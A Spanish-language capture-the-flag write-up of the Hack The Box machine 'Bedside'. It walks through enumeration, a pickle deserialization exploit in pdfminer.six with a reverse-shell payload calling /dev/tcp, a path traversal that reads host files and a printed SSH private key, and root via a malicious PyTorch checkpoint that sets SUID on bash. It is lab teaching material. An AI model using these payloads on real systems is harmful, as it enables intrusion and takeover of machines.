---
created: 2026-8-6
description: Bedside es una máquina Linux que aloja una aplicación de subida de archivos vulnerable a CVE-2025-70559, lo que permite la ejecución remota de código mediante la deserialización insegura de pickle en pdfminer.six. El acceso inicial implica explotar una vulnerabilidad de path traversal en un visor de imágenes interno para escapar del contenedor y recuperar una clave privada SSH. La escalada de privilegios se consigue abusando de un cargador de checkpoints de PyTorch sin restricciones para ejecutar payloads maliciosos de pickle como root.
---

#htb #medium #linux #web #subdomains #pdfminer #cve-2025-70559 #pickle #deserialization #pdf #rce #containers #docker #container-escape #path-traversal #sudo #pytorch #pytorch-checkpoint #machine-learning
# Enumeración
## Nmap

```bash
[hvidal@fedora] ~/d/h/h/m/b/scan
❯ nmap -p- --open -vvv --min-rate 5000 -n 10.129.248.191 -oG scan
Discovered open port 80/tcp on 10.129.248.191
Discovered open port 22/tcp on 10.129.248.191
```

Puertos abiertos: 80,22

```bash
[hvidal@fedora] ~/d/h/h/m/b/scan
❯ nmap -p 22,80 -sCV 10.129.248.191 -oN portscan.txt -Pn
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.68
|_http-title: Did not follow redirect to http://bedside.htb/
|_http-server-header: Apache/2.4.68 (Debian)
```

Añadir `bedside.htb` a `/etc/hosts`.
```bash
[hvidal@fedora] ~/d/h/h/m/b/scan
❯ echo "10.129.248.191 bedside.htb" | sudo tee -a /etc/hosts
```

## Subdominios

Apache 2.4.68 no presenta vulnerabilidades conocidas, la página principal no expone nada interesante y la enumeración de directorios contra `bedside.htb` tampoco revela nada relevante.

Probar a enumerar subdominios.
```bash
[hvidal@fedora] ~/d/h/h/m/b/scan
❯ ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.bedside.htb" -fw 21 -u http://bedside.htb/
research                [Status: 200, Size: 3152]
```

Añadir `research.bedside.htb` a `/etc/hosts`.
```bash
[hvidal@fedora] ~/d/h/h/m/b/scan
❯ sudo sed -i '/bedside\.htb/ s/$/ research.bedside.htb/' /etc/hosts
```

`research.bedside.htb` solo expone una funcionalidad de subida de archivos que acepta los formatos: `jpeg`, `jpg`, `png`, `bmp`, `tiff`, `dcm`, `pdf`, `gz`, `zip`.

![[file_formats.png]]

Al inspeccionar las cabeceras de respuesta HTTP se observa que la aplicación utiliza `pdfminer.six`, que es vulnerable a CVE-2025-70559.
```bash
[hvidal@fedora] ~/d/h/h/m/b/content
❯ curl -i http://research.bedside.htb/
HTTP/1.1 200 OK
Server: Apache/2.4.68 (Debian)
X-Powered-By: pdfminer.six
Content-Type: text/html; charset=UTF-8
```

# Explotación
## Descripción de la vulnerabilidad

[CVE-2025-70559](https://github.com/advisories/GHSA-f83h-ghpp-7wcc) afecta a `pdfminer.six` debido al uso inseguro del módulo `pickle` de Python al cargar archivos CMap.

La biblioteca carga y deserializa archivos `.pickle.gz` utilizando el módulo `pickle` de Python.

Dado que `pickle` ejecuta la lógica de reconstrucción incrustada en los objetos serializados, deserializar datos controlados por un atacante puede conducir a la ejecución arbitraria de código. Por ejemplo:
```python
class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("touch /tmp/pwned",))

serialized_data = pickle.dumps(Evil())
deserialized_data = pickle.loads(serialiced_data)  # Crea /tmp/pwned
```

Si un atacante puede controlar el CMap cargado por `pdfminer.six`, la biblioteca lo deserializará usando `pickle`, lo que resultará en ejecución arbitraria de código.

Aunque podemos subir PDFs y la aplicación muestra el siguiente mensaje:
>*All files submitted here are for staff use only and are strictly confidential. Certain file formats may be converted to standardized formats before being used for AI training.*

Es razonable sospechar que los PDFs están siendo procesados.

## Serialización maliciosa

Para explotar la vulnerabilidad, necesitamos dos archivos:
- Un archivo `.pickle.gz` malicioso que contenga el payload.
- Un PDF que haga referencia a una `/Font` personalizada con un campo `/Encoding` que apunte al CMap malicioso.
Cuando `pdfminer.six` procesa el PDF, intenta cargar el CMap referenciado y deserializa nuestro archivo `.pickle.gz` malicioso, lo que da lugar a ejecución arbitraria de código.

En primer lugar, crear el archivo `.pickle.gz` malicioso con el siguiente script.
```python
import pickle
import gzip

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1' &",))

open("evil.pickle.gz", "wb").write(gzip.compress(pickle.dumps(Evil())))
```

A continuación, crear un PDF mínimo válido con los campos `/Font` y `/Encoding`.
El campo `/Encoding` debe hacer referencia a la ruta absoluta del CMap subido, que es la indicada por la aplicación web: `/var/www/research.bedside.htb/uploads`.
```python
encoding = "/var/www/research.bedside.htb/uploads/evil"
encoding = encoding.replace("/","#2F")

pdf = f"""%PDF-1.4
1 0 obj<< /Type /Catalog /Pages 2 0 R >>endobj
2 0 obj<< /Type /Pages /Kids [3 0 R] /Count 1 >>endobj
3 0 obj<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R
/Resources << /Font << /F1 5 0 R >> >> >>endobj
4 0 obj<< /Length 20 >>stream
BT /F1 12 Tf ET
endstream endobj
5 0 obj<< /Type /Font /Subtype /Type0 /BaseFont /F
/Encoding /{encoding} /DescendantFonts [6 0 R] >>endobj
6 0 obj<< /Type /Font /Subtype /CIDFontType2 /BaseFont /F
/CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >>
/FontDescriptor 7 0 R >>endobj
7 0 obj<< /Type /FontDescriptor /FontName /F /Flags 4
/FontBBox [-1000 -1000 1000 1000] /ItalicAngle 0 /Ascent 1000
/Descent -200 /CapHeight 800 /StemV 80 >>endobj
trailer<< /Size 8 /Root 1 0 R >>
%%EOF
"""


with open("trigger.pdf", "wb") as f:
    f.write(pdf.encode())
```

Iniciar un listener.
```bash
[hvidal@fedora] ~/d/h/h/m/b/content
❯ nc -lnvp 4444
```

Luego, subir `evil.pickle.gz` y `trigger.pdf` a la aplicación.

## Post-explotación

Comprobar si se trata de un contenedor Docker.
```bash
datawrangler@data-wrangler:/app$ ls -la /.dockerenv
-rwxr-xr-x 1 root root 0 Nov 11  2025 /.dockerenv
```
Esta shell se encuentra dentro de un contenedor Docker, no en el host.

En `/tmp` hay disponible un escáner de puertos personalizado; usarlo para ver si existe algún servicio oculto.
```bash
datawrangler@data-wrangler:/tmp$ bash portscan.sh 127.0.0.1
22
80
3000
```

Identificar el servicio que escucha en el puerto 3000.
```bash
datawrangler@data-wrangler:/tmp$ curl -I 127.0.0.1:3000
HTTP/1.1 200 OK
```
El puerto 3000 sirve una aplicación de visor de imágenes.

Probar la aplicación en busca de path traversal.
```bash
datawrangler@data-wrangler:/tmp$ curl -o /dev/null -w "%{http_code}\n" --path-as-is 'http://127.0.0.1:3000/../../../../etc/passwd'
200
```

La aplicación es vulnerable a path traversal y los archivos se están leyendo desde el sistema de archivos del host en lugar del contenedor.
```bash
datawrangler@data-wrangler:/tmp$ curl --path-as-is 'http://127.0.0.1:3000/../../../../etc/passwd' | grep bash
root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
```
El `/etc/passwd` muestra el usuario developer, que no existe en el contenedor.

Usarlo para leer la clave privada SSH de `developer`.
```bash
datawrangler@data-wrangler:/tmp$ curl --path-as-is 'http://127.0.0.1:3000/../../../../../home/developer/.ssh/id_rsa'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAAAAAJj05ixK9OYs
SgAAAAtzc2gtZWQyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAA
AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn
RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

Conectarse al host mediante SSH.
```bash
[hvidal@fedora] ~/d/h/h/m/b/content
❯ chmod 600 id_rsa

[hvidal@fedora] ~/d/h/h/m/b/content
❯ ssh -i id_rsa developer@bedside.htb
developer@bedside:~$
```

Leer la flag de usuario.
```bash
developer@bedside:~$ cat user.txt
```

# Escalada de privilegios

## Enumeración

`developer` puede ejecutar un comando sospechoso como `root` sin contraseña.
```bash
developer@bedside:~$ sudo -l
User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

El propósito del script es automatizar el entrenamiento de un modelo de deep learning utilizando PyTorch y MONAI.

Cuando se ejecuta, el script construye un dataset a partir de `/datastore/processed`. Si no hay muestras disponibles, mueve archivos válidos desde `/datastore/staging` a `/datastore/processed`. Una vez preparado el dataset, busca el checkpoint más reciente en `/datastore/checkpoints` y lo restaura usando `CheckpointLoader`.

```python
DATASTORE_ROOT = Path("/datastore")
CHECKPOINT_DIR = DATASTORE_ROOT / "checkpoints"
```

```python
def find_latest_checkpoint(checkpoint_dir: Path):
    ckpts = sorted(checkpoint_dir.glob("*.pt"), key=os.path.getmtime)
    return ckpts[-1] if ckpts else None

	latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)
```

Cuando localiza el checkpoint, el script lo carga usando `CheckpointLoader` sin ninguna validación.
Sin embargo, debe existir al menos una imagen válida en `/datastore/processed`, de lo contrario el script termina antes de llegar a la etapa de carga del checkpoint.

```python
if n_data == 0:
		logger.warning("No data available to train. Exiting.")
		return

if latest_ckpt:
    loader = CheckpointLoader(
        load_path=str(latest_ckpt),
        load_dict={
            "model": model,
            "optimizer": optimizer
        },
        map_location=DEVICE
    )

    loader(engine)
```

`CheckpointLoader` restaura los checkpoints usando `torch.load()`, que emplea el módulo `pickle` para deserializar los datos, lo que da lugar a una posible ejecución remota de código si se coloca un checkpoint malicioso en `CHECKPOINT_DIR`.

## Explotación

Comprobar los permisos de `/datastore`.
```bash
developer@bedside:~$ ls -ld /datastore/
drwxrwx--- 8 datawrangler dataops 4096 Jul 13 14:00 /datastore/
```
`developer` no puede escribir en `/datastore`, pero `datawrangler` sí, que es el usuario del contenedor.

Primero, crear el archivo `.pt` malicioso, que establecerá el bit SUID en `/bin/bash`, con el siguiente script:
```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("chmod u+s /bin/bash",))

torch.save(Evil(), "evil_checkpoint.pt")
```

Crear un archivo Zip que contenga el checkpoint malicioso y cualquier imagen válida, y subirlo a `research.bedside.htb`.
```bash
[hvidal@fedora] ~/d/h/h/m/b/c/evil_torch
❯ zip checkpoint.zip evil_checkpoint.pt image.png
```

Extraer el archivo en el contenedor.
```bash
datawrangler@data-wrangler:/tmp$ cp /var/www/research.bedside.htb/uploads/checkpoint.zip .

datawrangler@data-wrangler:/tmp$ python3 -c "import zipfile; zipfile.ZipFile('checkpoint.zip').extractall('.')"
```

Copiar el `.pt` malicioso a `/datastore/checkpoints`.
```bash
datawrangler@data-wrangler:/tmp$ cp evil_checkpoint.pt /datastore/checkpoints
```

Copiar la imagen a `/datastore/processed`.
```bash
datawrangler@data-wrangler:/tmp$ cp image.png /datastore/processed
```

Y eliminar todos los archivos `.txt` de `/datastore/processed` y `/datastore/staging/`, porque los archivos `.txt` están incluidos en `ALLOWED_EXTS`, pero las transformaciones de imagen no pueden procesarlos, lo que provoca que el proceso de entrenamiento falle antes de que se cargue el checkpoint malicioso.
```bash
datawrangler@data-wrangler:/tmp$ rm /datastore/staging/*.txt /datastore/processed/*.txt
```

Ejecutar el script con `sudo` como `developer`.
```bash
developer@bedside:~$ sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
2026-08-06 13:29:23,458 | INFO | Device: cpu
2026-08-06 13:29:23,460 | INFO | Using 1 samples for training.
2026-08-06 13:29:23,761 | INFO | Auto-detected input features: 16384
2026-08-06 13:29:23,789 | INFO | Found checkpoint /datastore/checkpoints/evil_checkpoint.pt, loading with CheckpointLoader (callable mode)...
```

Ejecutar `bash -p` para obtener una shell de root.
```bash
developer@bedside:/tmp$ bash -p
bash-5.2$
```

Leer la flag de `root`.
```bash
bash-5.2$ cat /root/root.txt
```